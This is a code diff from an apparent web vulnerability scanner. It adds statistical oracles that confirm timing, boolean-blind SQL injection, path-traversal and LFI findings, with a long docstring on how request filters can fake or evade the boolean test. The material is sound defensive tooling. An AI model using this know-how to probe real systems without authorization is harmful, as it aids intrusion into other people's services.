+        high = [float(x) for x in (dose.get("high_samples") or [])]
+        low_ms = float(dose.get("low_ms", 0.0) or 0.0)
+        high_ms = float(dose.get("high_ms", 0.0) or 0.0)
+        if len(low) >= min_samples and len(high) >= min_samples and low_ms > 0 and high_ms > low_ms:
+            low_shift = _hodges_lehmann(base, low)
+            high_shift = _hodges_lehmann(base, high)
+            expected_ratio = high_ms / low_ms
+            observed_ratio = (high_shift / low_shift) if low_shift > 0 else 0.0
+            # The observed shift must actually SCALE with the injected delay. A
+            # constant offset (a slow proxy) gives ratio ~1.0 regardless; a real
+            # dose gives ~expected_ratio. Require the ratio to sit above the
+            # halfway point between "no scaling" (1) and full scaling, and not
+            # wildly overshoot — so ratio 1.0 is refused, ratio ~expected passes.
+            lower = 1.0 + 0.5 * (expected_ratio - 1.0)
+            upper = 1.5 * expected_ratio
+            dose_ok = lower <= observed_ratio <= upper
+            dose_conf = 0.9 if dose_ok else 0.0
+            dose_detail = f"; dose ratio {observed_ratio:.2f} vs expected {expected_ratio:.2f}"
+        else:
+            dose_ok = True  # malformed dose spec: do not penalise, just don't corroborate
+
+    fired = reject and effect_ok and dose_ok
+
+    if not fired:
+        why = []
+        if not reject:
+            why.append(f"rank-sum p={p:.4g} >= alpha={alpha}")
+        if not effect_ok:
+            why.append(f"median shift {shift:.0f}ms < floor {floor:.0f}ms")
+        if not dose_ok:
+            why.append("dose-response failed")
+        return OracleSignal(
+            kind=OracleKind.TIMING, fired=False, confidence=0.0,
+            # Channel-confirmed negative: this branch is past the min-samples guard, so a
+            # real hypothesis test ran over adequate paired latencies and did not detect a
+            # shift — a decisive "no timing channel" clean (the insufficient-samples early
+            # return above stays non-conclusive → inconclusive, as it had no usable test).
+            conclusive=True,
+            evidence="no timing signal: " + "; ".join(why),
+            observed={"z": z, "p_value": p, "median_shift_ms": shift, "floor_ms": floor},
+        )
+
+    p_conf = min(0.9, 1.0 - p)
+    eff_conf = min(0.85, shift / injected_ms) if injected_ms else min(0.85, shift / (floor * 2))
+    confidence = _noisy_or([p_conf, eff_conf, dose_conf])
+    return OracleSignal(
+        kind=OracleKind.TIMING,
+        fired=True,
+        confidence=confidence,
+        evidence=(
+            f"delay-injected requests are slower (Mann-Whitney z={z:.2f}, p={p:.3g}); "
+            f"median shift {shift:.0f}ms >= floor {floor:.0f}ms{dose_detail}"
+        ),
+        observed={
+            "z": z, "p_value": p, "median_shift_ms": shift, "floor_ms": floor,
+            "n_baseline": len(base), "n_treatment": len(treat), "dose_ok": dose_ok,
+        },
+    )
+
+
+def _sprt_decision(
+    signals: Any,
+    *,
+    alpha: float,
+    beta: float,
+    p1: float,
+    p0: float,
+) -> tuple[str | None, float, int, int, float, float]:
+    """The Wald SEQUENTIAL PROBABILITY RATIO TEST core, factored out so more than one oracle can
+    share the SAME sequential test (``boolean_inference_oracle`` and ``credential_stuffing_oracle``).
+
+    ``signals`` is an ITERABLE of bools consumed LAZILY: the loop stops pulling from the iterable
+    at the first boundary, so a generator that computes each Bernoulli signal on demand does no
+    work past the decision (this keeps ``boolean_inference_oracle`` byte-identical to its old
+    inline loop — the same per-round work, in the same order, stopping at the same round).
+
+    Returns ``(decided, llr, n_used, n_signal, upper, lower)`` where ``decided`` is ``"confirm"``
+    (LLR >= log((1-beta)/alpha)), ``"refute"`` (LLR <= log(beta/(1-alpha))), or ``None`` (no
+    boundary reached — inconclusive, a non-fire, never a guess). Pure + deterministic."""
+    upper = math.log((1.0 - beta) / alpha)
+    lower = math.log(beta / (1.0 - alpha))
+    llr = 0.0
+    n_used = 0
+    n_signal = 0
+    decided: str | None = None
+    for sig in signals:
+        n_used += 1
+        n_signal += 1 if sig else 0
+        llr += math.log(p1 / p0) if sig else math.log((1.0 - p1) / (1.0 - p0))
+        if llr >= upper:
+            decided = "confirm"
+            break
+        if llr <= lower:
+            decided = "refute"
+            break
+    return decided, llr, n_used, n_signal, upper, lower
+
+
+def _boolean_round_arm(r: Mapping[str, Any], key: str) -> list[Any]:
+    """One truth-side arm of a boolean probe round as a list (``[]`` when absent/malformed).
+
+    The round shape is ``{"trues": [...], "falses": [...], "true_repeats": [...],
+    "false_repeats": [...]}`` — ``trues``/``falses`` are the responses to K DISTINCT,
+    syntactically-VARIED clauses of one fixed truth value; ``*_repeats`` are their
+    index-aligned BYTE-IDENTICAL repeats."""
+    v = r.get(key)
+    return list(v) if isinstance(v, (list, tuple)) else []
+
+
+_BOOLEAN_DIMENSIONS = ("status", "length", "lexical", "structural")
+
+
+_BOOLEAN_DEFAULT_DIMENSIONS = ("status", "length", "lexical")
+
+
+def _boolean_discriminator(discriminator: Mapping[str, Any] | str | None) -> dict[str, Any]:
+    """The effective discriminator for EVERY boolean comparison — fully protocol-pinned.
+
+    Only the DIMENSIONS may be narrowed by a caller, and only within ``_BOOLEAN_DIMENSIONS``. The
+    THRESHOLDS are pinned too (they are simply dropped): they set SENSITIVITY, and a threshold fitted to
+    a particular set of retained bytes can manufacture "within-cluster same, across-cluster differ" out
+    of noise — the same forgery the SPRT parameters allowed. No live caller passes thresholds (all three
+    pass protocol constants), so pinning costs nothing and removes the seam entirely rather than leaving
+    a comment claiming it is unreachable."""
+    if isinstance(discriminator, str):
+        disc: dict[str, Any] = {"dimensions": [discriminator]}
+    else:
+        disc = dict(discriminator or {})
+    wanted = [d for d in (disc.get("dimensions") or _BOOLEAN_DEFAULT_DIMENSIONS)
+              if d in _BOOLEAN_DIMENSIONS]
+    return {"dimensions": wanted or list(_BOOLEAN_DEFAULT_DIMENSIONS), "expect": "differ"}
+
+
+def _boolean_reflection_forms(clause: str) -> tuple[str, ...]:
+    """Every encoding of ``clause`` that could appear reflected in a response body: the RAW clause,
+    both HTML-escaped forms (quotes escaped and not), and both URL-encoded forms. Deduplicated and
+    ordered LONGEST-first so a shorter encoding can never bite a substring of a longer one."""
+    if not clause:
+        return ()
+    forms = {
+        clause,
+        html.escape(clause, quote=True),
+        html.escape(clause, quote=False),
+        _urlquote(clause, safe=""),
+        _urlquote(clause),
+    }
+    return tuple(sorted((f for f in forms if f), key=len, reverse=True))
+
+
+def _mask_boolean_reflection(resp: Any) -> Any:
+    """Return ``resp`` with every occurrence of ITS OWN retained injected ``clause`` (raw /
+    HTML-escaped / URL-encoded) stripped from the body. A response carrying no ``clause`` is returned
+    UNCHANGED (an old context, or an arm that never reflected), so the behaviour on a non-reflecting
+    target — and on every pre-existing retained context — is byte-for-byte what it was."""
+    if not isinstance(resp, Mapping):
+        return resp
+    clause = resp.get("clause")
+    if not clause:
+        return resp
+    body = _coerce_text(resp.get("body", resp.get("text", resp.get("content", ""))))
+    for form in _boolean_reflection_forms(str(clause)):
+        body = body.replace(form, "")
+    out = dict(resp)
+    out["body"] = body
+    return out
+
+
+def boolean_inference_oracle(
+    probe_rounds: Any,
+    *,
+    alpha: float = 0.05,
+    beta: float = 0.05,
+    p1: float = 0.9,
+    p0: float = 0.1,
+    discriminator: Mapping[str, Any] | str | None = None,
+    false_baseline_samples: Any = None,
+    min_baseline_samples: int = 6,
+    min_true_clauses: int = 4,
+    min_false_clauses: int = 4,
+) -> OracleSignal:
+    """Confirm a boolean-blind vulnerability by a Wald SEQUENTIAL PROBABILITY RATIO TEST
+    over repeated probes whose per-round signal is a TRUTH-VALUE ATTRIBUTION test.
+
+    THE GUARANTEE (and the only one). A ``boolean_sqli`` FACT requires the response to be a
+    deterministic FUNCTION OF THE INJECTED BOOLEAN'S TRUTH VALUE. It is NOT enough that the
+    "true" request and the "false" request came back different: on a page whose body is drawn
+    INDEPENDENTLY of the input (a rotating banner, an A/B bucket, a load-balanced pair of
+    replicas) two draws differ by coincidence, and no amount of determinism *screening* removes
+    that — a sample window that LOOKS deterministic still produces the coincidence inside it.
+    This oracle therefore does not screen for determinism and then trust a single true/false
+    pair; it demands that the response PARTITION BY TRUTH VALUE:
+
+      * Each round carries ``K_T >= min_true_clauses`` responses to DISTINCT, syntactically
+        VARIED clauses that are all logically TRUE (``trues``), and ``K_F >=
+        min_false_clauses`` responses to DISTINCT, varied clauses that are all logically
+        FALSE (``falses``) — plus an index-aligned BYTE-IDENTICAL repeat of each
+        (``true_repeats`` / ``false_repeats``).
+      * The round signals 1 only when ALL THREE hold:
+          1. DETERMINISM       — every clause, sent twice byte-identically, does not differ
+                                 (enforced globally as a HARD REFUTE, below).
+          2. WITHIN-TRUTH      — every TRUE-side response agrees with every other TRUE-side
+             AGREEMENT          response (ONE true cluster), and likewise for the FALSE side
+                                 (``differential_response_oracle`` non-fire inside a cluster).
+          3. ACROSS-TRUTH      — every TRUE-side response DIFFERS from every FALSE-side
+             SEPARATION         response (the two clusters are disjoint).
+
+    WHY AN INPUT-INDEPENDENT PAGE CANNOT PASS (the bound, and its exact scope). Say each
+    response is an INDEPENDENT draw from an arbitrary variant distribution ``{p_v}`` — a
+    rotating banner, an A/B bucket, two replicas behind a balancer. Then the ``2*K_T`` true-side
+    and ``2*K_F`` false-side responses are ``2*(K_T+K_F)`` independent draws, and a clean
+    2-cluster split by truth value needs every true-side draw to be the SAME variant ``a``,
+    every false-side draw the same variant ``b``, and ``a != b``:
+
+        s  =  SUM over a != b of  p_a**(2*K_T) * p_b**(2*K_F)   <=  2 * 2**-(2*K_T + 2*K_F)
+
+    (maximised by a UNIFORM 2-variant page). At the ``K_T = K_F = 7`` the drivers ship that is
+    ``s <= 2 * 2**-28 = 7.5e-9``; at the oracle's CONFIRM floor (``K_T = K_F = 4``) it is
+    ``s <= 2 * 2**-16 = 3.1e-5``, still ~3300x below the SPRT's null rate ``p0 = 0.1``. With
+    ``alpha = beta = 0.05, p1 = 0.9, p0 = 0.1`` the confirm boundary is two NET signalling
+    rounds, so a gambler's-ruin bound puts the per-FINDING false-confirm probability at
+    ``<= s**2 / (1 - 2s)`` — ``~5.6e-17`` at ``K = 7`` — and that bound holds with NO determinism
+    pre-gate at all. The skew that defeated a 16-sample determinism pre-gate (a dominant variant
+    ``p ~ 0.9`` passes ``0.9**16 ~ 19%`` of windows) makes this test STRICTER, not weaker.
+
+    TWO THINGS THIS BOUND DOES NOT COVER. Both are real, both are demonstrated, and NEITHER is
+    "impossible to observe" — an earlier revision of this docstring said so and was wrong:
+
+      (a) A TRUTH-CORRELATED REQUEST FILTER — STATUS: OPEN. An interposer that partitions the
+          probes by a property of the REQUEST that happens to track truth value, with no boolean
+          channel behind it at all. The bound above says nothing about this, because it is a
+          property of the CLAUSE SET, not of the page.
+
+          WHY IT IS OPEN, STRUCTURALLY — this is the part to read, not the ladder. The oracle needs
+          clauses whose truth value VIGIL knows A PRIORI: before the request is sent, without
+          touching the target's database. A predicate knowable that way IS A CONSTANT EXPRESSION,
+          and any constant expression the scanner can evaluate offline, a filter in front of a
+          static page can also evaluate offline. So no clause set removes this residual; a clause
+          set only raises the COMPLEXITY of the function the filter has to implement. Every
+          mitigation in this area is therefore a TREADMILL, and the measured ladder below is that
+          treadmill being climbed, one rung per revision.
+
+          THE LADDER, all measured through the REAL mint path against a STATIC, NON-VULNERABLE page
+          (no SQL anywhere, no boolean channel — every FACT is false by construction):
+
+            literal-only set (`X = X` / `X = Y`)   vs CRS-942130 backreference regex   2000/2000
+            shape-varied set                       vs the same CRS-942130 regex             0/2000
+            shape-varied FOLDABLE subset (K=6)     vs a complete ~60-line CONSTANT FOLDER  200/200
+            SHIPPED set (K=7, with `IN (SELECT)`)  vs that same folder                       0/200
+            SHIPPED set                            vs that folder + a THREE-LINE `IN` rule  600/600
+            SHIPPED set, literals randomised       vs folder + a NINE-STRING `IN` blocklist 300/300
+            SHIPPED set                            vs an exact-string blocklist of its TRUEs 200/200
+            SHIPPED set                            vs ANY filter blind to one shape           0 each
+
+          Read the ladder as a whole. Each row that reaches 0 was called a fix; the next row is that
+          fix being cleared by a filter one rule larger. The folder is ~60 lines and contains no SQL
+          engine, no parser generator and no database; the `IN` rule that took the last 0 back to
+          600/600 is three lines, because `LIT IN (SELECT LIT)` over a one-row constant select IS
+          literal equality (sqlite3: `3 IN (SELECT 3)` -> 1, `3 IN (SELECT 5)` -> 0) — `X = X` vs
+          `X = Y` in a costume, with the same separating surface feature. The randomised-literal row
+          is the same lesson: the clause TEMPLATES are public in an open-source repo, so the filter
+          derives its rules from them and only needs nine strings for the one randomised atom —
+          which is why the literals are now a STABLE PUBLIC CONSTANT instead (correlatability and
+          replayability are worth more than a mitigation that measures zero).
+
+          PROVENANCE, so no row is taken for more than it is. Four rows are PINNED by live
+          regressions that re-measure them every CI run at 10-20 trials each
+          (``scanner/tests/test_boolean_inference_check.py``): CRS-942130 both halves, the complete
+          folder, the folder blinded to one shape, and the exact-string blocklist. The 2000-,
+          600- and 300-trial figures are one-off at-scale runs of those same cells, not CI cells.
+          (The 300/300 row was 299/300 as the red-pen first measured it; the one miss was their
+          folder's naive OR-split cutting inside a string literal that happened to contain "or" —
+          a fixture artefact, and the fixture here masks literals before splitting.)
+
+          WHAT THE CLAUSE SET DOES BUY, precisely and no more: a filter must be COMPLETE over the
+          shape set to partition. Blind it to any ONE comparison shape and it blocks only part of
+          the TRUE side, within-truth agreement breaks, and the round REFUTES — measured 0 for the
+          CRS-942130 rule, for equality-only, lexicographic-only, numeric-direction-only,
+          LIKE-prefix-only and generic block-any-OR/quote filters, and 0 in a LEAVE-ONE-SHAPE-OUT
+          sweep for every one of the seven shipped shapes blinded. That is a real property and it
+          is why the common real-world filter refutes. It is NOT sufficiency, and an earlier
+          revision of this docstring that said the set was closed by a "SQL-EVALUATED" pair was
+          wrong: the pair is a seventh comparison shape, no more.
+
+          WHAT AN OPERATOR SHOULD CONCLUDE. A boolean_sqli FACT is sound against a page whose body
+          varies independently of the input (the bound above) and against every INCOMPLETE
+          request-side filter. It is NOT sound against a filter purpose-built to decide this clause
+          set, and such a filter is cheap. Where that matters — a target known to sit behind an
+          aggressive WAF, or a FACT whose whole weight rests on this one oracle — corroborate with a
+          channel that does not live in the response bytes (an OOB/DNS callback, an error-signature
+          or a timing arm), or treat it as a LEAD.
+
+          RESIDUAL (a2) — STATUS: OPEN, and out of reach from the response side. An interposer that
+          genuinely EVALUATES the injected expression (a WAF embedding a real SQL parser and
+          evaluator) can partition the probes by truth value with no database behind it. That is the
+          same shape of limit as (b) — such an interposer IS computing the truth function this
+          oracle reads — and no clause set defeats it from the response side; it needs an
+          out-of-band channel (OOB/DNS, a side effect) to separate. (a) is NOT a special case of
+          (a2) and must not be filed under it: (a) needs no evaluator at all, only a folder.
+
+          A caller supplying its own clause sets inherits the shape-diversity obligation and the
+          same open residual; see ``scanner.checks.boolean_clause_families``.
+
+      (b) A page that is a DETERMINISTIC but ARBITRARY function of the request — STATUS: OPEN,
+          and BOUNDED rather than closed (a CDN caching per exact URL over an origin that picked a
+          variant at fill time, a balancer pinning each URL to a replica). There the byte-identical
+          repeats are cache HITS, not independent draws, and re-running the SAME clauses in a
+          later round returns the SAME bytes — so neither the repeats nor the extra SPRT rounds are
+          new evidence, and the per-FINDING bound degrades to the single-draw one:
+
+              SUM over a != b of  p_a**K_T * p_b**K_F   <=  2 * 2**-(K_T + K_F)
+
+          = ``1.2e-4`` at ``K = 7``, and the formula is CALIBRATED, not assumed: over the real
+          mint path a uniform 2-variant cached page measures ``1.20e-4`` at ``K = 7``
+          (200k trials) against an analytic ``1.22e-4``, and ``7.9e-3`` at ``K = 4`` against an
+          analytic ``7.8e-3``. (A
+          single-clause-per-truth-value design — what this test replaced — sits at ``~0.5``.)
+          Repetition cannot help against a map that is by definition constant in the request, so
+          for THIS case more distinct clauses is the lever — and it is the lever that keeps the
+          seventh shipped clause (the ``IN (SELECT ...)`` pair) in the set now that its original
+          "a folder cannot decide it" justification is retracted: at ``K = 6`` this residual is 4x
+          worse (analytic ``2 * 2**-12`` = ``4.9e-4``). It is not free: every extra clause is
+          another chance that a real vulnerable target answers ONE of them differently and the
+          round refutes, so ``K`` trades this residual against recall. The drivers also BOUND the
+          number of independent attempts per URL and state the resulting per-URL figure (see
+          ``live/runtime_redrive.py::boolean_redrive``).
+
+    THE TWO DETERMINISM MECHANISMS ARE A CHEAP PRE-FILTER, NOT THE SOUNDNESS CORE:
+      1. BASELINE PRE-GATE — ``false_baseline_samples`` is a run of ``>= min_baseline_samples``
+         responses to ONE IDENTICAL false-clause request collected up front; not-all-identical
+         proves non-determinism → REFUSE. A confirm still REQUIRES it to have passed
+         (fail-closed), but it is no longer what makes the oracle sound.
+      2. PER-ROUND HARD REFUTE — if ANY clause's byte-identical repeat differs from the clause,
+         the WHOLE finding hard-refutes (the page is provably non-deterministic).
+
+    CALLER OBLIGATION (the oracle sees responses, not requests). The ``K_T``/``K_F`` clauses must
+    genuinely be DISTINCT requests of a FIXED truth value and must VARY IN COMPARISON SHAPE rather
+    than only in their literals — which buys refutation against every INCOMPLETE request-side
+    filter and nothing beyond it (residual (a) above stays OPEN whatever the caller ships). The
+    oracle cannot check any of that from the bytes. The drivers enforce distinctness where the
+    clauses live (``BooleanInferenceCheck`` and ``DifferentialHttpAdapter`` both refuse a duplicate
+    or a cross-side clause at the call site) and build their families from
+    ``scanner.checks.boolean_clause_families``; the shape property is a review obligation on the
+    clause sets, pinned by the live CRS-942130, constant-folder and leave-one-shape-out
+    regressions — the folder cell PINS the open class (it must keep minting), not a win.
+
+    WHAT "RE-VERIFIES OFFLINE" DOES AND DOES NOT MEAN. Re-execution over a retained context
+    recomputes this whole decision from the retained bytes, so a GROSS edit (a swapped page, a
+    dropped arm, a removed baseline, a truncated clause list) is rejected. It is NOT a byte
+    integrity check: the comparison is deliberately FUZZY (``length`` 5%, ``lexical`` 10%), so a
+    sub-threshold edit inside a retained body — a byte, a word — does not change the verdict.
+    Byte integrity comes from the certificate signature and digest binding, not from this oracle.
+
+    FAIL-CLOSED ON SHAPE. A round that does not carry the multi-clause truth-value arms — an
+    OLD single-clause retained context ``{"true", "false_a", "false_b", "false_a_repeat"}``
+    included — can NEVER be a positive signal: it yields 0 and the SPRT refutes. Old-shape
+    evidence can only refute, never mint.
+
+    RECALL COST (honest, and the safe direction). A legitimately noisy-but-vulnerable page
+    (per-request ``__VIEWSTATE`` / CSRF token / rotating banner), and a vulnerable page whose
+    varied true clauses do not all land on the same response, are REFUSED to a LEAD. That is a
+    documented false-LEAD, never a false FACT.
+    """
+    rounds = [r for r in (probe_rounds or []) if isinstance(r, Mapping)]
+
+    def _nondeterministic(reason: str) -> OracleSignal:
+        # A non-deterministic page cannot support boolean inference → LEAD, never a FACT and never a
+        # CLEAN (conclusive=False): the page MIGHT be vulnerable but noisy — refusing it is a recall
+        # cost, not a proof of safety. decision="refute" (fired=False) so a downstream refute-branch
+        # still classifies it as "did not mint", while conclusive=False keeps it out of any CLEAN.
+        return OracleSignal(
+            kind=OracleKind.BOOLEAN_INFERENCE, fired=False, confidence=0.0, conclusive=False,
+            evidence=("boolean inference REFUSED — page is not deterministic to identical input "
+                      f"({reason}); boolean-blind inference is unsound on a non-deterministic page → LEAD"),
+            observed={"decision": "refute", "nondeterministic": True, "reason": reason},
+        )
+
+    # PIN the dimensions (never latency / marker) and force expect="differ" — see _BOOLEAN_DIMENSIONS.
+    disc = _boolean_discriminator(discriminator)
+
+    def _same(a: Any, b: Any) -> bool:
+        """Do two observed responses AGREE? ``differential_response_oracle`` is the authority; an
+        EXACT match short-circuits it (identical bytes + identical status make every dimension
+        non-differing, so the oracle provably cannot fire) — a pure speed path, never a
+        semantic one.
+
+        Before the discriminator compares them, each response has ITS OWN reflected injected clause
+        removed (``_mask_boolean_reflection``): on a page that echoes the distinct clause back into
+        its body, two same-truth-value responses only DIFFER in that reflection, so masking is what
+        lets a genuine channel behind a reflection attribute. It never manufactures one — a reflect-
+        only page masks to the SAME residual on both sides and stays indistinguishable. A response
+        with no retained ``clause`` masks to itself, so a non-reflecting target is unchanged."""
+        if a == b:
+            return True
+        return not differential_response_oracle(
+            _mask_boolean_reflection(a), _mask_boolean_reflection(b), disc).fired
+
+    # --- PRE-FILTER 1: BASELINE DETERMINISM PRE-GATE ----------------------------------------------
+    baseline = list(false_baseline_samples) if false_baseline_samples is not None else None
+    baseline_deterministic = False
+    if baseline is not None and len(baseline) >= 2:
+        ref = baseline[0]
+        if any(not _same(ref, s) for s in baseline[1:]):
+            return _nondeterministic(
+                f"{len(baseline)} identical-request baseline samples are not all identical")
+        baseline_deterministic = len(baseline) >= min_baseline_samples
+
+    # --- PRE-FILTER 2: HARD REFUTE on any observed non-determinism (a byte-identical repeat that
+    #     came back different). Covers every clause of the new shape AND the legacy false_a pair. ---
+    for r in rounds:
+        pairs = list(zip(_boolean_round_arm(r, "trues"), _boolean_round_arm(r, "true_repeats")))
+        pairs += list(zip(_boolean_round_arm(r, "falses"), _boolean_round_arm(r, "false_repeats")))
+        legacy_rep = r.get("false_a_repeat")
+        if legacy_rep is not None and "false_a" in r:
+            pairs.append((r["false_a"], legacy_rep))
+        for clause_resp, repeat_resp in pairs:
+            if not _same(clause_resp, repeat_resp):
+                return _nondeterministic(
+                    "a byte-identical clause repeat returned a different response in a probe round")
+
+    def _truth_value_attributed(r: Mapping[str, Any]) -> bool:
+        """THE SOUNDNESS CORE — is this round's response a FUNCTION of the injected truth value?
+        One TRUE cluster, one FALSE cluster, and the two disjoint. Short-circuits."""
+        trues = _boolean_round_arm(r, "trues")
+        falses = _boolean_round_arm(r, "falses")
+        t_reps = _boolean_round_arm(r, "true_repeats")
+        f_reps = _boolean_round_arm(r, "false_repeats")
+        # FAIL-CLOSED on shape: too few DISTINCT clauses per truth value, or a missing repeat, and the
+        # round cannot attribute anything → it is not a positive signal (an old-shape round lands here).
+        if (len(trues) < min_true_clauses or len(falses) < min_false_clauses
+                or len(t_reps) != len(trues) or len(f_reps) != len(falses)):
+            return False
+        t_cluster = trues + t_reps
+        f_cluster = falses + f_reps
+        # (2) WITHIN-TRUTH AGREEMENT — all of one truth value land on ONE response.
+        for cluster in (t_cluster, f_cluster):
+            for i in range(len(cluster)):
+                for j in range(i + 1, len(cluster)):
+                    if not _same(cluster[i], cluster[j]):
+                        return False
+        # (3) ACROSS-TRUTH SEPARATION — every TRUE response differs from every FALSE response.
+        for t in t_cluster:
+            for f in f_cluster:
+                if _same(t, f):
+                    return False
+        return True
+
+    def _round_signals():
+        for r in rounds:
+            yield _truth_value_attributed(r)
+
+    decided, llr, n_used, signals, upper, lower = _sprt_decision(
+        _round_signals(), alpha=alpha, beta=beta, p1=p1, p0=p0)
+
+    observed = {
+        "rounds_used": n_used, "signal_rounds": signals, "llr": llr,
+        "upper": upper, "lower": lower, "decision": decided or "inconclusive",
+        "baseline_samples": (len(baseline) if baseline is not None else 0),
+        "baseline_deterministic": baseline_deterministic,
+        "min_true_clauses": min_true_clauses, "min_false_clauses": min_false_clauses,
+        # the ACTUAL clause counts the judged rounds carried (the analytic bound is a function of THESE,
+        # not of the floor) — recorded so an auditor can recompute the bound from the retained evidence.
+        "true_clauses_per_round": sorted({len(_boolean_round_arm(r, "trues")) for r in rounds}),
+        "false_clauses_per_round": sorted({len(_boolean_round_arm(r, "falses")) for r in rounds}),
+    }
+    if decided == "confirm":
+        # FAIL-CLOSED determinism pre-filter: a FACT also requires the baseline pre-gate to have PASSED
+        # (>= min_baseline_samples identical up-front samples). Belt-and-braces on top of the
+        # truth-value attribution that carries the soundness — a confirm without a determinism proof is
+        # DOWNGRADED to inconclusive (a LEAD, never a FACT).
+        if not baseline_deterministic:
+            observed["decision"] = "inconclusive"
+            observed["confirm_without_baseline_pregate"] = True
+            return OracleSignal(
+                kind=OracleKind.BOOLEAN_INFERENCE, fired=False, confidence=0.0, conclusive=False,
+                evidence=(
+                    f"SPRT reached the confirm boundary in {n_used} round(s) but the baseline "
+                    f"determinism pre-gate did NOT pass ({observed['baseline_samples']} < "
+                    f"{min_baseline_samples} identical up-front samples) — a boolean FACT requires "
+                    "proving the page is deterministic to identical input first → LEAD"),
+                observed=observed,
+            )
+        # confidence reflects the controlled type-I error rate of the test
+        confidence = min(0.99, 1.0 - alpha)
+        return OracleSignal(
+            kind=OracleKind.BOOLEAN_INFERENCE, fired=True, confidence=confidence,
+            evidence=(
+                f"SPRT confirmed boolean inference in {n_used} round(s): {signals} round(s) in which the "
+                f"response was a FUNCTION of the injected truth value "
+                f"(K_T={observed['true_clauses_per_round']} distinct TRUE clauses all agree, "
+                f"K_F={observed['false_clauses_per_round']} distinct FALSE clauses all agree, each also "
+                f"stable to a byte-identical repeat, and the two clusters disjoint), behind a passed "
+                f"determinism pre-gate ({observed['baseline_samples']} identical baseline samples), "
+                f"LLR={llr:.2f} >= {upper:.2f}"
+            ),
+            observed=observed,
+        )
+    reason = "refuted (indistinguishable)" if decided == "refute" else "inconclusive (no boundary reached)"
+    # A REFUTE decision is a channel-confirmed negative: the SPRT accumulated enough
+    # evidence to accept the null (no boolean channel) at the controlled type-II rate,
+    # so it is a decisive "provably-tested-clean". Running out of rounds WITHOUT reaching
+    # a boundary is genuinely inconclusive (never a clean), so it is NOT conclusive.
+    return OracleSignal(
+        kind=OracleKind.BOOLEAN_INFERENCE, fired=False, confidence=0.0,
+        conclusive=(decided == "refute"),
+        evidence=f"SPRT {reason} after {n_used} round(s): LLR={llr:.2f} in ({lower:.2f}, {upper:.2f})",
+        observed=observed,
+    )
+
+
+def _searchable(sink: Any) -> str:
+    if isinstance(sink, Mapping):
+        return "\n".join(f"{k}={_coerce_text(v)}" for k, v in sink.items())
+    if isinstance(sink, (list, tuple)):
+        return "\n".join(_coerce_text(x) for x in sink)
+    return _coerce_text(sink)
+
+
+def side_effect_oracle(marker: str, observed_sink: Any, control_sink: Any = None) -> OracleSignal:
+    """Fire when a unique, attacker-chosen marker appears somewhere it should not.
+
+    WHERE THIS ORACLE IS THE SOLE AUTHORITY (`verifier.BUG_CLASS_ORACLES`):
+    ``path_traversal`` and ``lfi``. Nothing else adjudicates those two classes, so
+    for them this function's verdict IS the FACT. It is also one of several
+    confirmers for ``error_based_sqli`` / ``sqli`` / ``rce`` / ``command_injection``
+    / ``ssti`` / ``el_injection`` / ``ssi`` / ``xxe`` / ``websocket_injection``.
+
+    WHERE IT IS **NOT** USED: XSS. A "reflected/stored XSS canary in rendered
+    output" is precisely what this oracle must NOT be used for — ``xss`` goes to
+    REFLECTION_CONTEXT (a proven breakout) and ``stored_xss``/``dom_xss`` to
+    DOM_EXECUTION (proven execution). Marker-in-a-sink is substring XSS detection,
+    the false positive both of those exist to refuse.
+
+    The marker must be non-trivial (>= 4 chars) so we do not confirm on incidental
+    substrings.
+
+    ``control_sink`` (OPTIONAL — absent ⇒ every existing caller is byte-identical) is the sink
+    observed under a BENIGN control on the same insertion point. When it is supplied and ALREADY
+    CONTAINS the marker, the marker's presence under the payload is NOT attributable to the payload
+    and the oracle REFUSES. That is the offline-re-derivable half of the fix for a measured defect:
+    a marker that is not attacker-UNIQUE (a KNOWN-CONTENT file signature such as ``root:x:0:0:``)
+    is present in an ordinary security knowledge-base page that merely documents it, and bare
+    substring presence minted four ``path_traversal`` FACTs against a site with ZERO file I/O.
+    Producers that hold a control must retain it here so re-verification re-derives the refusal.
+
+    KNOWN LIMITATION (RED-PEN), only PARTLY closed by ``control_sink``: a marker's PRESENCE in a
+    sink is not proof that the PAYLOAD put it there — an endpoint that echoes its own input into the
+    sink produces the same observation. A supplied ``control_sink`` refuses the KNOWN-CONTENT case,
+    but where no control is supplied, and for the sole-authority ``path_traversal``/``lfi`` classes,
+    a full payload-correlation / content-provenance guard is still owed (its own slice). Until then,
+    treat a bare ``path_traversal``/``lfi`` confirmation as needing a human look at the snippet.
+
+    Pure: it decides from the retained sinks alone and sends nothing."""
+    marker = (marker or "").strip()
+    haystack = _searchable(observed_sink)
+
+    if len(marker) < 4:
+        return OracleSignal(
+            kind=OracleKind.SIDE_EFFECT, fired=False, confidence=0.0,
+            evidence="marker too short to be a reliable canary",
+            observed={"marker": marker})
+
+    if control_sink is not None and marker in _searchable(control_sink):
+        return OracleSignal(
+            kind=OracleKind.SIDE_EFFECT, fired=False, confidence=0.0,
+            evidence=(f"marker {marker!r} is ALREADY PRESENT in the benign control response — its "
+                      "presence under the payload is not attributable to the payload"),
+            observed={"marker": marker, "present_in_control": True})
+
+    idx = haystack.find(marker)
+    if idx < 0:
+        return OracleSignal(
+            kind=OracleKind.SIDE_EFFECT, fired=False, confidence=0.0,
+            evidence=f"marker {marker!r} not present in sink",
+            observed={"marker": marker})
+
+    start = max(0, idx - 24)
+    snippet = haystack[start: idx + len(marker) + 24]
+    return OracleSignal(
+        kind=OracleKind.SIDE_EFFECT,
+        fired=True,
+        confidence=0.9,
+        evidence=f"marker {marker!r} reached sink: ...{snippet}...",
+        observed={"marker": marker, "offset": idx, "snippet": snippet},
+    )
+
+
+_INERT_TEXT_CONTAINERS = frozenset({
+    "noscript", "noembed", "noframes", "textarea", "title", "template",
+    "iframe", "xmp", "plaintext", "style",
+})
+
+
+_JS_MIME_ESSENCES = frozenset({
+    "application/ecmascript", "application/javascript", "application/x-ecmascript",
+    "application/x-javascript", "text/ecmascript", "text/javascript",
+    "text/javascript1.0", "text/javascript1.1", "text/javascript1.2",
+    "text/javascript1.3", "text/javascript1.4", "text/javascript1.5",
+    "text/jscript", "text/livescript", "text/x-ecmascript", "text/x-javascript",
+})
+
+
+def _script_is_executable(
+    type_attr: str | None, has_nomodule: bool
+) -> tuple[bool, str]:
+    """Decide whether a browser EXECUTES a ``<script>``'s inline text, from its RAW
+    ``type`` attribute value and the presence of ``nomodule``.
+
+    Returns ``(executable, reason)``; ``reason`` names the non-executing rule.
+
+    ``type_attr`` is the RAW attribute value (``None`` when the attribute is
+    absent) — *not* stripped and *not* lowercased by the caller, because the HTML
+    Living Standard's rules distinguish the raw empty string from a whitespace-only
